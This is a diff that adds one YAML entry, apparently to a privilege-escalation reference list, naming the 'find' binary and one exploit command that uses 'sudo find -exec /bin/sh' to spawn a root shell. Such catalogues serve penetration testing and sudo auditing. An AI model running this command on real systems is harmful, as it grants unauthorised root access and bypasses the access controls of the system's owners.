@@ -1,0 +1,4 @@
+name: find
+binary_path: /usr/bin/find
+exploit_cmds:
+- sudo /usr/bin/find . -exec /bin/sh \; -quit
